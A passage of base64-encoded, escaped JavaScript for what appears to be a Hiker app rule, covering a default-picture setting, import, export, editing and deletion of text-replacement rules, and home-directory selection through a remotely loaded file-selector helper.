wgMCkgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuZGVmX1BpYyA9IFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgUEFUSDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYXZlRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiOmRlZmF1bHRQaWNCYWNrXFxcXFxcXCIsIFxcXFxcXFwidHJ1ZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYWNrKCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kv67mlLnmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZmlsZVR5cGU6IFxcXFxcXFwiLmpwZ3wuanBlZ3wuZ2lmfC5wbmd8LnN2Z3wuYm1wXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBvbkNsaWNrVHlwZTogXFxcXFxcXCJjb25maXJtXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBzdG9yZTogXFxcXFxcXCJzZWxlY3RQYXRoQ2FjaGUyXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBtZW1vcnlQYXRoOiB0cnVlXFxcXG4gICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGJyZWFrO1xcXFxuICAgIGNhc2UgXFxcXFxcXCJyZXBsYWNlUnVsZVxcXFxcXFwiOlxcXFxuICAgICAgICBpZiAoTVlfUEFSQU1TLmlzUmVmcmVzaCkge1xcXFxuICAgICAgICAgICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4gcmVmcmVzaFBhZ2UoKSkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHNldFBhZ2VUaXRsZShcXFxcXFxcIuabv+aNouinhOWImXzorr7nva5cXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBydWxlTGlzdCA9IFtdO1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBjb25maXJtKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+mUmeivr+aPkOekuicsXFxcXG4gICAgICAgICAgICAgICAgY29udGVudDogJ+abv+aNouaVsOaNruivu+WPluWksei0pe+8jOaYr+WQpuWIneWni+WMlu+8n1xcXFxcXFxcbuivpeaTjeS9nOS8mua4hemZpOS9oOeahOabv+aNouaVsOaNriEhIScsXFxcXG4gICAgICAgICAgICAgICAgY29uZmlybTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZUZpbGUoXFxcXFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICB0b2FzdChcXFxcXFxcIuWIneWni+WMluWujOaIkFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICAgICAgICBjYW5jZWw6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAvL3RvYXN0KFxcXFxcXFwi5Y+W5raIXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuaWsOW7uuabv+aNolxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9lZGl0UmVwbGFjZVJ1bGUudmlldyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSMjbm9SZWZyZXNoIz9pc05ldz10cnVlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5a+85Ye66KeE5YiZXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCLnoa7orqTlr7zlh7pcXFxcXFxcIiArIHJ1bGVMaXN0Lmxlbmd0aCArIFxcXFxcXFwi5p2h6KeE5YiZ77yfXFxcXFxcXFxuKHtob21lUHRhaH0vcmVwbGFjZVJ1bGUuanNvbilcXFxcXFxcIikuY29uZmlybSgobnVtKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgc2F2ZVB0YSA9IENvbmZpZy5ob21lUGF0aCArIFxcXFxcXFwiL3JlcGxhY2VSdWxlLmpzb25cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoc2F2ZVB0YSwgcmVhZEZpbGUoXFxcXFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcXFxcXCIpIHx8IFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgbG9nKFxcXFxcXFwiXFxcXFxcXFxu6Lev5b6E77yaXFxcXFxcXCIgKyBzYXZlUHRhICsgXFxcXFxcXCJcXFxcXFxcXG7lr7zlh7rop4TliJkgXFxcXFxcXCIgKyBudW0gKyBcXFxcXFxcIiDmnaFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwic2hhcmU6Ly9cXFxcXFxcIiArIHNhdmVQdGE7XFxcXG4gICAgICAgICAgICB9LCBydWxlTGlzdC5sZW5ndGgpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8zXFxcXFxcXCJcXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcbiAgICAgICAgZnVuY3Rpb24gaW1wb3J0UnVsZShpc2JhY2spIHtcXFxcbiAgICAgICAgICAgIGlucHV0ID0gdHlwZW9mIFBBVEggPT09IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIgPyBpbnB1dCA6IFBBVEg7XFxcXG4gICAgICAgICAgICBpbnB1dCA9IGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIpID8gaW5wdXQgOiBcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIGlucHV0XFxcXG4gICAgICAgICAgICBsZXQgcnVsZVRleHQgPSByZXF1ZXN0KGlucHV0KTtcXFxcbiAgICAgICAgICAgIGlmICghcnVsZVRleHQpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6I635Y+W5paH5Lu25Li656m6XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgIGxldCBuZXdSdWxlTGlzdCA9IEpTT04ucGFyc2UocnVsZVRleHQpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBydWxlTGlzdCA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcXFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcXFxcXCIpIHx8IFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgbGV0IG5ld0NvdW50ID0gMCxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlQ291bnQgPSAwO1xcXFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgaW4gbmV3UnVsZUxpc3QpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IG5ld1J1bGUgPSBuZXdSdWxlTGlzdFtpXTtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFuZXdSdWxlLmhhc093blByb3BlcnR5KFxcXFxcXFwicmVwbGFjZW1lbnRcXFxcXFxcIikgfHwgIW5ld1J1bGUuaGFzT3duUHJvcGVydHkoXFxcXFxcXCJwYXR0ZXJuXFxcXFxcXCIpIHx8ICFuZXdSdWxlLmhhc093blByb3BlcnR5KFxcXFxcXFwibmFtZVxcXFxcXFwiKSB8fCAobmV3UnVsZS5zY29wZUNvbnRlbnQgPT09IHVuZGVmaW5lZCA/IGZhbHNlIDogIW5ld1J1bGUuc2NvcGVDb250ZW50KSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGlkID0gbmV3UnVsZS5pZDtcXFxcbiAgICAgICAgICAgICAgICAgICAgbmV3UnVsZS5pZCA9IGlkIHx8IG5ldyBEYXRlKCkuZ2V0VGltZSgpO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgaWRJbmRleCA9IHJ1bGVMaXN0LmZpbmRJbmRleChydWxlID0+IHJ1bGUuaWQgPT09IGlkKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGlkSW5kZXggPiAtMSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlQ291bnQrKztcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJ1bGVMaXN0LnNwbGljZShpZEluZGV4LCAxLCBuZXdSdWxlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG5ld0NvdW50Kys7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBydWxlTGlzdC5wdXNoKG5ld1J1bGUpO1xcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShydWxlTGlzdCkpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChpc2JhY2spIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYmFjaygpO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGxvZyhcXFxcXFxcIlxcXFxcXFxcbui3r+W+hO+8mlxcXFxcXFwiICsgaW5wdXQgKyBcXFxcXFxcIlxcXFxcXFxcbuaAu+inhOWImeaVsO+8mlxcXFxcXFwiICsgbmV3UnVsZUxpc3QubGVuZ3RoICsgXFxcXFxcXCJcXFxcXFxcXG7mm7TmlrDop4TliJkgXFxcXFxcXCIgKyB1cGRhdGVDb3VudCArIFxcXFxcXFwiIOadoVxcXFxcXFxcdOaWsOWinuinhOWImSBcXFxcXFxcIiArIG5ld0NvdW50ICsgXFxcXFxcXCIg5p2hXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi5a+85YWl5oiQ5YqfXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChpc2JhY2spIGJhY2soKTtcXFxcbiAgICAgICAgICAgICAgICB0b2FzdChcXFxcXFxcIuWvvOWFpeWksei0pVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLlr7zlhaXop4TliJlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogJChbXFxcXFxcXCLlpJbpg6jmlofku7ZcXFxcXFxcIiwgXFxcXFxcXCLlhoXpg6jmlofku7ZcXFxcXFxcIl0sIDEsIFxcXFxcXFwi6KeE5YiZ5a+85YWlXFxcXFxcXCIpLnNlbGVjdCgoaW1wb3J0UnVsZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PT0gXFxcXFxcXCLlpJbpg6jmlofku7ZcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJmaWxlU2VsZWN0Oi8vXFxcXFxcXCIgKyAkLnRvU3RyaW5nKGltcG9ydFJ1bGUpO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCByZXF1aXJlVXJsID0gXFxcXFxcXCJodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD01MDk5XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBmaWxlU2VsZWN0ID0gcmVxdWlyZShyZXF1aXJlVXJsKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZpbGVTZWxlY3QuZmlsZVNlbGVjdGlvblVyaSh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjazogJC50b1N0cmluZyhpbXBvcnRSdWxlLCB0cnVlKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVpcmVVcmw6IHJlcXVpcmVVcmwsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBmaWxlVHlwZTogXFxcXFxcXCIuanNvblxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DbGlja1R5cGU6IFxcXFxcXFwiY29uZmlybVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbWVtb3J5OiBcXFxcXFxcInNlbGVjdFBhdGhDYWNoZVxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0sIGltcG9ydFJ1bGUpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8zXFxcXFxcXCJcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDAsIGxlbiA9IHJ1bGVMaXN0Lmxlbmd0aDsgaSA8IGxlbjsgaSsrKSB7XFxcXG4gICAgICAgICAgICBsZXQgcmVwbGFjZVJ1bGUgPSBydWxlTGlzdFtpXTtcXFxcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogcmVwbGFjZVJ1bGUubmFtZSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNsczogaWQgKyBcXFxcXFxcIi5cXFxcXFxcIiArIGksXFxcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuWIoOmZpFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChpZCwgaW5kZXgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIHJ1bGVMaXN0ID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFxcXFxcInJlcGxhY2VSdWxlLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJbXVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGcgPSBydWxlTGlzdC5zcGxpY2UoaW5kZXgsIDEpO1xcXFxuXFxcXG4gICAgICAgICAgICAgICAgICAgIHNhdmVGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShydWxlTGlzdCkpO1xcXFxuICAgICAgICAgICAgICAgICAgICAvL2RlbGV0ZUl0ZW1CeUNscyhpZCArIFxcXFxcXFwiLlxcXFxcXFwiICsgaW5kZXgpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi5Yig6Zmk5oiQ5YqfXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfSwgaWQsIGkpLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNsczogaWQgKyBcXFxcXFxcIi5cXFxcXFxcIiArIGlcXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLnvJbovpFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2VkaXRSZXBsYWNlUnVsZS52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjP2luZGV4PVxcXFxcXFwiICsgaSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBjbHM6IGlkICsgXFxcXFxcXCIuXFxcXFxcXCIgKyBpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNsczogaWQgKyBcXFxcXFxcIi5cXFxcXFxcIiArIGlcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlIFxcXFxcXFwiY29udGVudHNcXFxcXFxcIjpcXFxcbiAgICAgICAgbGV0IGYgPSByZXF1aXJlKFxcXFxcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXFxcXFwiKTtcXFxcbiAgICAgICAgc2V0UGFnZVRpdGxlKFxcXFxcXFwi55uu5b2V6K6+572ufOiuvue9rlxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6YCJ5oup5paH5Lu25aS5XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IEpTT04uc3RyaW5naWZ5KGYuZmlsZVNlbGVjdGlvblVyaSh7XFxcXG4gICAgICAgICAgICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKGlkKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0YXJnZXQgPSBmaW5kSXRlbShpZCkuZXh0cmE7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oaWQsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHRhcmdldCwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogUEFUSFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlO1xcXFxuICAgICAgICAgICAgICAgIH0sIGlkKSxcXFxcbiAgICAgICAgICAgICAgICBpbml0aWFsUGF0aDogQ29uZmlnLmhvbWVQYXRoLFxcXFxuICAgICAgICAgICAgICAgIHJlcXVpcmVVcmw6IFxcXFxcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHBhdHRlcm46IDFcXFxcbiAgICAgICAgICAgIH0pKSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuaUr+aMgWhpa2VyOi8vZmlsZXPot6/lvoQo6K+l5pON5L2c5LiN5Lya5Yid5aeL5YyW55uu5b2VKVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBkZWZhdWx0VmFsdWU6IENvbmZpZy5ob21lUGF0aCxcXFxcbiAgICAgICAgICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoaWQpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoaWQsIGlucHV0KTtcXFxcbiAgICAgICAgICAgICAgICB9LCBpZCksXFxcXG4gICAgICAgICAgICAgICAgaWQ6IGlkXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuehruiupFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGlkKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGlucHV0ID0gZ2V0TXlWYXIoaWQsIGZpbmRJdGVtKGlkKS5leHRyYS5kZWZhdWx0VmFsdWUgfHwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQuc3RhcnRzV2l0aChcXFxcXFxcImhpa2VyOi8vZmlsZXMvXFxcXFxcXCIpKSBpbnB1dCA9IGdldFBhdGgoaW5wdXQpLnNsaWNlKDcpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dC5lbmRzV2l0aChcXFxcXFxcIi9cXFxcXFxcIikpIGlucHV0ID0gaW5wdXQucmVwbGFjZSgvXFxcXFxcXFwvJC8sIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChDb25maWcuaG9tZVBhdGggPT0gaW5wdXQpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey57uP5piv5b2T5YmN55uu5b2VXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFxcXFxcImNvbmZpZy5qc29uXFxcXFxcXCIsIDApIHx8IFxcXFxcXFwie31cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgQ29uZmlnLmhvbWVQYXRoID0gaW5wdXQ7XFxcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoXFxcXFxcXCJjb25maWcuanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShDb25maWcpLCAwKTtcXFxcbiAgICAgICAgICAgICAgICBiYWNrKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7Lkv53lrZhcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0sIGlkKSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcbiAgICAgICAgYnJlYWs7XFxcXG59XFxcXG5zZXRSZXN1bHQobGF5b3V0KTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjdi7nvJbovpHmm7/mjaLop4TliJlcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZWRpdFJlcGxhY2VSdWxlLnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5jb25zdCBpc05ldyA9IE1ZX1BBUkFNUy5pc05ldyB8fCBnZXRQYXJhbShcXFxcXFxcImlzTmV3XFxcXFxcXCIpO1xcXFxuY29uc3QgaW5kZXggPSBNWV9QQVJBTVMuaW5kZXggfHwgTnVtYmVyKGdldFBhcmFtKFxcXFxcXFwiaW5kZXhcXFxcXFxcIikpO1xcXFxubGV0IGxheW91dCA9IFtdO1xcXFxuYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLm5hbWVcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcIi5lZGl0UmVwbGFjZVJ1bGUuaXNSZWdleFxcXFxcXFwiKTtcXFxcbiAgICBjbGVhck15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5wYXR0ZXJuXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnJlcGxhY2VtZW50XFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLmZpcnN0XFxcXFxcXCIpO1xcXFxuICAgIC8vY2xlYXJNeVZhcihcXFxcXFxcIi5lZGl0UmVwbGFjZVJ1bGUuc2NvcGVcXFxcXFxcIik7XFxcXG59KSk7XFxcXG5sZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxubGV0IGlkID0gXFxcXFxcXCIjXFxcXFxcXCIgKyBuZXcgRGF0ZSgpLmdldFRpbWUoKTtcXFxcbi8vbGV0IHJlcGxhY2VSdWxlID0gaXNOZXcgPT0gXFxcXFxcXCJ0cnVlXFxcXFxcXCI/e306cnVsZUxpc3RbaW5kZXhdO1xcXFxuaWYgKGlzTmV3ID09IFxcXFxcXFwidHJ1ZVxcXFxcXFwiKSB7XFxcXG4gICAgcmVwbGFjZVJ1bGUgPSB7XFxcXG4gICAgICAgIGlkOiBuZXcgRGF0ZSgpLmdldFRpbWUoKSxcXFxcbiAgICAgICAgaXNSZWdleDogZmFsc2UsXFxcXG4gICAgfVxcXFxufSBlbHNlIHtcXFxcbiAgICByZXBsYWNlUnVsZSA9IHJ1bGVMaXN0W2luZGV4XTtcXFxcbn1cXFxcbi8v6aaW5qyh5Yid5aeL5YyWXFxcXG5pZihnZXRNeVZhcihcXFxcXFxcIi5lZGl0UmVwbGFjZVJ1bGUuZmlyc3RcXFxcXFxcIixcXFxcXFxcIlxcXFxcXFwiKT09XFxcXFxcXCJcXFxcXFxcIil7XFxcXG4gICAgcHV0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VS